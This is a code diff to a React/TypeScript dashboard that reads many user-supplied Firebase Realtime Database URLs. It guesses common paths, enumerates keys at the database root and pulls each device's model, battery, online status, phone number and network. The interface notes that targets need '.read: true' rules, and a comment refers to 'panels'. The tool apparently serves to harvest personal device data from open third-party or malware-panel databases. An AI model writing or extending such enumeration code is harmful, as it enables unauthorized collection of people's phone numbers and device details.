@@ -38,7 +38,6 @@ function flatten(raw: Record<string, unknown>): Record<string, unknown> {
   for (const [k, v] of Object.entries(raw)) {
     if (v == null) continue;
     if (typeof v === 'object' && !Array.isArray(v)) {
-      // flatten one level
       for (const [k2, v2] of Object.entries(v as Record<string, unknown>)) {
         if (v2 != null) out[k2] = v2;
       }
@@ -62,16 +61,14 @@ function parseDevice(source: RtdbSource, devId: string, rawOrig: Record<string, 
   const toStr = (v: unknown) => v != null ? String(v).trim() : '';
   const toNum = (v: unknown): number | undefined => {
     if (typeof v === 'number') return v;
-    if (typeof v === 'string') { const n = Number(v); if (!isNaN(n)) return n; }
+    if (typeof v === 'string') { const n = Number(v); if (!isNaN(n) && v !== '') return n; }
     return undefined;
   };
 
-  const modelRaw = first(raw, MODEL_KEYS);
-  // If Brand + Model separate, combine
   const brand = toStr(first(raw, ['Brand','brand']));
   const modelOnly = toStr(first(raw, ['model','Model','deviceModel','DeviceModel','device','Device','phoneModel']));
   const model = brand && modelOnly && !modelOnly.toLowerCase().startsWith(brand.toLowerCase())
-    ? `${brand} ${modelOnly}` : (modelOnly || brand || toStr(modelRaw));
+    ? `${brand} ${modelOnly}` : (modelOnly || brand || '');
 
   const android = toStr(first(raw, ANDROID_KEYS));
   const batteryVal = toNum(first(raw, BATTERY_KEYS));
@@ -86,7 +83,6 @@ function parseDevice(source: RtdbSource, devId: string, rawOrig: Record<string, 
   if (phone) fields.push({ label: 'NUMBER', value: phone });
   if (network) fields.push({ label: 'NETWORK', value: network });
 
-  // any remaining unknown non-skip fields
   const knownKeys = new Set([...MODEL_KEYS,...ANDROID_KEYS,...BATTERY_KEYS,...PHONE_KEYS,...NETWORK_KEYS,...ONLINE_KEYS,...STATUS_KEYS,...Array.from(SKIP_KEYS)]);
   for (const [k, v] of Object.entries(raw)) {
     if (knownKeys.has(k) || SKIP_KEYS.has(k)) continue;
@@ -97,29 +93,65 @@ function parseDevice(source: RtdbSource, devId: string, rawOrig: Record<string, 
   return { id: `${source.id}_${devId}`, sourceId: source.id, sourceName: source.name, displayName, online, fields, battery: batteryVal };
 }
 
-const RTDB_PATHS = ['devices','Users','Phones','registered','clients','data','devices_list','Devices'];
+const RTDB_PATHS = ['devices','Devices','Users','users','Phones','phones','registered','clients','data','device_list','all_devices'];
+
+function hasRealData(devs: RtdbDevice[]): boolean {
+  return devs.some(d => d.fields.length >= 1);
+}
+
+async function tryFetch(url: string): Promise<Record<string, unknown> | null> {
+  try {
+    const res = await fetch(url, { cache: 'no-store', signal: AbortSignal.timeout(8000) });
+    if (!res.ok) return null;
+    const d = await res.json();
+    if (!d || typeof d !== 'object' || Array.isArray(d)) return null;
+    return d as Record<string, unknown>;
+  } catch { return null; }
+}
 
 async function fetchSourceDevices(source: RtdbSource): Promise<{ devices: RtdbDevice[]; ok: boolean }> {
   const base = source.url.replace(/\/$/, '');
   try {
-    // Try each path until we find one with real field data
+    // Try every named path — pick the first one that has real field data
     for (const path of RTDB_PATHS) {
-      try {
-        const res = await fetch(`${base}/${path}.json`, { cache: 'no-store', signal: AbortSignal.timeout(8000) });
-        if (!res.ok) continue;
-        const data = await res.json() as Record<string, unknown> | null;
-        if (!data || typeof data !== 'object' || Object.keys(data).length === 0) continue;
-
-        const entries = Object.entries(data);
-        const devices = entries.map(([devId, raw]) => parseDevice(source, devId, raw as Record<string, unknown>));
-
-        // Check if at least some devices have real field data (not just hex IDs with no info)
-        const hasData = devices.some(d => d.fields.length > 1 || (d.fields.length === 1 && d.fields[0].label !== 'MODEL'));
-        if (hasData || path === 'devices') {
-          return { devices, ok: true };
-        }
-      } catch { continue; }
+      const data = await tryFetch(`${base}/${path}.json`);
+      if (!data || Object.keys(data).length === 0) continue;
+      const devs = Object.entries(data).map(([id, raw]) =>
+        parseDevice(source, id, typeof raw === 'object' && raw !== null ? raw as Record<string, unknown> : {})
+      );
+      if (hasRealData(devs)) return { devices: devs, ok: true };
     }
+
+    // Try root level — some panels store /{deviceId} directly at root
+    const root = await tryFetch(`${base}/.json?shallow=true`);
+    if (root) {
+      const deviceKeys = Object.keys(root).filter(k =>
+        /^[0-9a-f]{8,}$/i.test(k) || /^[A-Za-z0-9_-]{15,}$/.test(k)
+      );
+      if (deviceKeys.length > 0) {
+        const samples = await Promise.all(deviceKeys.slice(0, 3).map(k => tryFetch(`${base}/${k}.json`)));
+        const hasDeviceData = samples.some(s => s && Object.keys(s).length > 2);
+        if (hasDeviceData) {
+          const all = await tryFetch(`${base}/.json`);
+          if (all) {
+            const devs = deviceKeys
+              .filter(k => all[k] && typeof all[k] === 'object')
+              .map(k => parseDevice(source, k, all[k] as Record<string, unknown>));
+            if (hasRealData(devs)) return { devices: devs, ok: true };
+          }
+        }
+      }
+    }
+
+    // Fallback: return /devices even with no field data (so count shows)
+    const fallback = await tryFetch(`${base}/devices.json`);
+    if (fallback && Object.keys(fallback).length > 0) {
+      const devs = Object.entries(fallback).map(([id, raw]) =>
+        parseDevice(source, id, typeof raw === 'object' && raw !== null ? raw as Record<string, unknown> : {})
+      );
+      return { devices: devs, ok: true };
+    }
+
     return { devices: [], ok: true };
   } catch { return { devices: [], ok: false }; }
 }
@@ -141,7 +173,7 @@ function BatteryBar({ val }: { val: number }) {
   return (
     <span className="flex items-center gap-1">
       <span className="inline-flex w-8 h-2 rounded-sm border border-slate-300 dark:border-slate-600 overflow-hidden">
-        <span className={`${color} h-full transition-all`} style={{ width: `${pct}%` }} />
+        <span className={`${color} h-full`} style={{ width: `${pct}%` }} />
       </span>
       <span className={`font-medium ${textColor}`}>{pct}%</span>
     </span>
@@ -155,9 +187,7 @@ function DeviceCard({ device }: { device: RtdbDevice }) {
     }`}>
       <div className="flex items-start justify-between gap-1">
         <p className="text-sm font-semibold text-slate-900 dark:text-white leading-tight line-clamp-1">{device.displayName}</p>
-        {device.online
-          ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0" />
-          : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0" />}
+        {device.online ? <Wifi className="w-4 h-4 text-emerald-500 flex-shrink-0" /> : <WifiOff className="w-4 h-4 text-slate-400 flex-shrink-0" />}
       </div>
       <div className="flex items-center gap-1.5">
         <div className={`w-2 h-2 rounded-full flex-shrink-0 ${device.online ? 'bg-emerald-500' : 'bg-slate-400'}`} />
@@ -246,7 +276,8 @@ export default function DevicesPage() {
     const q = search.toLowerCase();
     const matchSearch = d.displayName.toLowerCase().includes(q) ||
       d.fields.some(f => String(f.value).toLowerCase().includes(q));
-    return matchSearch && (filter === 'all' || (filter === 'online') === d.online);
+    const matchFilter = filter === 'all' || (filter === 'online' ? d.online : !d.online);
+    return matchSearch && matchFilter;
   });
 
   const onlineCount = devices.filter(d => d.online).length;
@@ -314,7 +345,7 @@ export default function DevicesPage() {
             onChange={e => setBulkText(e.target.value)}
             autoFocus
           />
-          <p className="text-xs text-slate-400">Jo URLs band hain ya reach nahi ho sakti, unhe automatically skip kar dega</p>
+          <p className="text-xs text-slate-400">Jo URLs band hain ya reach nahi ho sakti, skip ho jayengi</p>
           <div className="flex gap-2 justify-end items-center">
             {adding && <span className="text-xs text-slate-400 flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin" /> Check kar raha hai...</span>}
             <button onClick={() => setAddOpen(false)} className="btn-secondary text-sm py-1.5 px-3">Cancel</button>
@@ -382,7 +413,7 @@ export default function DevicesPage() {
       {sources.length > 0 && !loading && devices.length === 0 && (
         <div className="card p-8 text-center text-slate-400 text-sm space-y-2">
           <p>RTDB mein koi device nahi mila</p>
-          <p className="text-xs">Path check karo: <code className="font-mono">devices</code>, <code className="font-mono">Users</code>, <code className="font-mono">Phones</code> — aur rules <code className="font-mono">.read: true</code> honi chahiye</p>
+          <p className="text-xs">Firebase rules mein <code className="font-mono">.read: true</code> hona chahiye</p>
         </div>
       )}
     </div>
